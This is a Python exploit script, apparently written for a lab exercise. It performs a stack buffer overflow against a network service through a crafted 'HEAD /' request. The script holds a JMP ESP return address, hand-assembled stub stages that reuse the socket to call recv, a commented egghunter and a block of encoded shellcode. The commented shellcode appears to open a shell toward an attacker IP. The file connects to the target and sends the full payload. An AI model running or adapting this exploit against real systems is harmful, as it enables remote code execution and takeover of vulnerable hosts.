# -*- coding: utf-8 -*-
import socket
from time import sleep

RHOST = "192.168.15.10"
RPORT = 8008

'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.15.10", 8008))
'''

# JMP ESP: 0A135062
# STACK LEN: 66

# Egghunter , tag r4f4 :
# "6681caff0f42526a0258cd2e3c055a74"
# "efb8723466348bfaaf75eaaf75e7ffe7"
# Put this tag in front of your shellcode : r4f4r4f4
# EGG = 72 34 66 34

# SHELLCODE = '68C0A80F0C5e6668d9035f6a6658996a015b52536a0289e1cd809359b03fcd804979f9b066566657666a0289e16a10515389e1cd80b00b52682f2f7368682f62696e89e35253ebce'
# EGG_HUNTER = "6681caff0f42526a0258cd2e3c055a74efb8723466348bfaaf75eaaf75e7ffe7"
# EGG = "72346634"

# STAGE_1 = "A"*72
# STAGE_1 = "A" * 72
# STAGE_2 = "B"*50

# payload = "HEAD "+'A'*72+"\r\n" + STAGE_1 + JMP_ESP + STAGE_1 + '68F4010000' + '5B'
# payload = "HEAD /" + EGG_HUNTER + 'A' * (72 - len(EGG_HUNTER)) + JMP_ESP + JMP_BACK + EGG + EGG + STAGE_2

# stage1 = "41" * 72 + EGG_HUNTER + "41"*5 + JMP_ESP + JMP_BACK
# stage2 = EGG + EGG + STAGE_2

# ws2_32.recv = 00401D78
# 401D7811 - 11781D40
# SHR

JMP_ESP = '0A135062'
#JMP_ESP = 'AAAABBBB'
JMP_EBP = '40135062'
JMP_BACK = 'EBD6'

STAGE_1 = (
    "54"  # PUSH ESP
    "5A"  # POP EDX
    "83EA28"  # SUB EDX, 46 (46 hex == 70 decimal)
    "FFE2"  # JMP EDX
)

STAGE_1 += "90" * ((132 - len(STAGE_1))/2)

STAGE_2 = (
    "90"                  # NOP
    "54"                  # PUSH ESP
    "59"                  # POP ECX                 - We're going to align ECX to the socket number associated with our connection
    "6681C18801"  # ADD CX,0x188            - In our case, this requires us to add 0x188 hex / 392 decimal
    "83EC50"          # SUB ESP,50              - Move ESP above EIP so that we don't overwrite our own shellcode
    "33D2"              # XOR EDX,EDX             - Zero out EDX
    "52"                  # PUSH EDX                - Flags (WS2_32.recv argument) = 0
    "80C602"          # ADD DH,2                - EDX becomes 0x00000200h or 512 decimal
    "52"                  # PUSH EDX                - Buffer (WS2_32.recv argument) = 512 bytes / 0x200h
    "54"                  # PUSH ESP                - Move ESP
    "5B"                  # POP EBX                 - Into EBX to that we can setup where we want our recv'd shellcode to end up
    "83C350"          # ADD EBX,50              - Adjust where we want to do the recv
    "53"                  # PUSH EBX                - Buffer Location (WS2_32.recv argument) to hold our shellcode
    "FF31"              # PUSH DWORD PTR DS:[ECX] - the value at the address in ECX (where our sockfd is)
    "B811781D40"  # MOV EAX,40252C11         - modified version of our target location of 0040252C
    "C1E808"          # SHR EAX,8               - shift right 8 bytes, meaning we drop 11, and pick up 00 at the front
    "FFD0"              # CALL EAX  ; <JMP.&WS2_32.recv> ; CALL 0040252C  - call WS2_32.recv and read in our shellcode
)

print(len(STAGE_2))

STAGE_2 += '90' * ((72 - len(STAGE_2))/2)

shellcode =  ""
shellcode += "b8d9ad9ae7d9d0d97424f45b"
shellcode += "31c9b15283c30431430e039a"
shellcode += "a37812e054fedd18a59f54fd"
shellcode += "949f0376862f47da2bdb05ce"
shellcode += "b8a981e10907f4cc8a34c44f"
shellcode += "094719af30886cae75f59de2"
shellcode += "2e7133125acf889910c1887e"
shellcode += "e0e0b9d17abb19d0afb713ca"
shellcode += "acf2ea610688eca35671428a"
shellcode += "56809acb517be925a206eaf2"
shellcode += "d8dc7fe07b96d8cc7a7bbe87"
shellcode += "7130b4cf95c71964a14c9caa"
shellcode += "2316bb6e6fcca237d5a3db27"
shellcode += "b61c7e2c5b48f36f34bd3e8f"
shellcode += "c4a949fcf676e26abbff2c6d"
shellcode += "bcd589e143d6e9288082b942"
shellcode += "21ab5192ce7ef5c260d1b6b2"
shellcode += "c0815ed8cefe7fe30497ea1e"
shellcode += "cf58422f0331912f3cce1cc9"
shellcode += "28c04842c579d1187485cf65"
shellcode += "b60dfc9a79e68988ee06c4f2"
shellcode += "b919f29a268b995a20b0350d"
shellcode += "65064cdb9b31e6f961a7c1b9"
shellcode += "bd14cf403320eb528da9b706"
shellcode += "41fc61f02756c0aaf1058a3a"
shellcode += "87650d3c88a3fba0391abadf"
shellcode += "f6ca4a98ea6ab473af9bffd9"
shellcode += "8633a6889a595967d867da8d"
shellcode += "a193c2e4a4d84415d5712119"
shellcode += "4a7160"

print("[*] Crafting the payload...")

print(len(STAGE_1))
print(len(STAGE_2))

buff = STAGE_2 + JMP_ESP + STAGE_1

payload = "HEAD /" + buff

print("[*] Connecting to the target...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

print("[*] Sending payload...")
s.send(payload)
sleep(2)

print("[*] Payload sent, sending shelcode...")
s.send(shellcode)

print("[*] All done!")
